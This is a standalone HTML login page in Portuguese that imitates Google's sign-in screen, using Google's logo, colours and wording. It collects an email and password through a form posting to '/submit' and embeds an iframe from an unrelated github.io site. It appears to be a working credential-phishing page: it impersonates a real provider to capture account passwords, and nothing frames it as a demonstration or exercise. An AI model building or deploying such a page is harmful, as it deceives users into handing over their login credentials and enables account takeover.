<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tela de Login</title>
    <style>
        /* Reset básico */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .logo {
            width: 100px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #202124;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #5f6368;
            font-size: 14px;
        }

        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
        }

        .input-group input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }

        .save-button {
            width: 100%;
            padding: 10px;
            background-color: #1a73e8;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }

        .save-button:hover {
            background-color: #1557b0;
        }

        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #5f6368;
        }

        .footer a {
            color: #1a73e8;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Estilo para o iframe */
        .iframe-container {
            margin-top: 20px;
            width: 100%;
            height: 400px;
            border: 1px solid #dadce0;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Logo -->
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">

        <!-- Título -->
        <h1>Fazer login</h1>

        <!-- Formulário -->
        <form action="/submit" method="POST">
            <!-- Campo de Email -->
            <div class="input-group">
                <label for="email">E-mail ou telefone</label>
                <input type="email" id="email" name="email" placeholder="Digite seu e-mail" required>
            </div>

            <!-- Campo de Senha -->
            <div class="input-group">
                <label for="password">Senha</label>
                <input type="password" id="password" name="password" placeholder="Digite sua senha" required>
            </div>

            <!-- Botão de Salvar -->
            <button class="save-button" type="submit">Salvar</button>
        </form>

        <!-- Rodapé -->
        <div class="footer">
            <a href="#">Criar conta</a> • <a href="#">Esqueceu a senha?</a>
        </div>

        <!-- iframe para exibir a página externa -->
        <div class="iframe-container">
            <iframe src="https://nexusofcia.github.io/submit" width="100%" height="100%" frameborder="0"></iframe>
        </div>
    </div>
</body>
</html>
